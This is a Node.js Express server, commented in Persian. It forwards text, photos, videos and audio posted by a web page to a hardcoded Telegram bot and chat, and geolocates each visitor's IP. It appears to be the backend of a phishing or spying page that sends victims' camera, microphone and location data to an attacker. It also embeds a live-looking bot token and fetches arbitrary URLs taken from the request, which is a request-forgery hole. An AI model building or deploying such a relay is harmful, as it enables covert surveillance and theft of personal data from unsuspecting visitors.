import express from 'express';
import fetch from 'node-fetch';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = '8401969947:AAFLWQND6J1aAHaDcZSuhhM6gkDFdinD5_8';
const CHAT_ID = '7727238041';

app.use(express.json({ limit: '50mb' }));
app.use(express.static(__dirname));

// ارسال متن
app.post('/api/send', async (req, res) => {
  try {
    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: req.body.text })
    });
    res.json(await r.json());
  } catch (e) {
    res.json({ ok: false });
  }
});

// ارسال عکس
app.post('/api/send-photo', async (req, res) => {
  try {
    const form = new FormData();
    const blob = await fetch(req.body.photo).then(r => r.blob());
    form.append('photo', blob, 'photo.jpg');
    form.append('chat_id', CHAT_ID);

    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: form
    });
    res.json(await r.json());
  } catch (e) {
    res.json({ ok: false });
  }
});

// ارسال فیلم
app.post('/api/send-video', async (req, res) => {
  try {
    const form = new FormData();
    const blob = await fetch(req.body.video).then(r => r.blob());
    form.append('video', blob, 'video.mp4');
    form.append('chat_id', CHAT_ID);

    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
      method: 'POST',
      body: form
    });
    res.json(await r.json());
  } catch (e) {
    res.json({ ok: false });
  }
});

// ارسال صدا
app.post('/api/send-audio', async (req, res) => {
  try {
    const form = new FormData();
    const blob = await fetch(req.body.audio).then(r => r.blob());
    form.append('audio', blob, 'audio.ogg');
    form.append('chat_id', CHAT_ID);

    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
      method: 'POST',
      body: form
    });
    res.json(await r.json());
  } catch (e) {
    res.json({ ok: false });
  }
});

// دریافت موقعیت
app.get('/api/geo', async (req, res) => {
  try {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || '';
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,query`);
    const j = await r.json();
    res.json({ ip: j.query || ip, city: j.city || '', country: j.country || '' });
  } catch (e) {
    res.json({ ip: '', city: '', country: '' });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));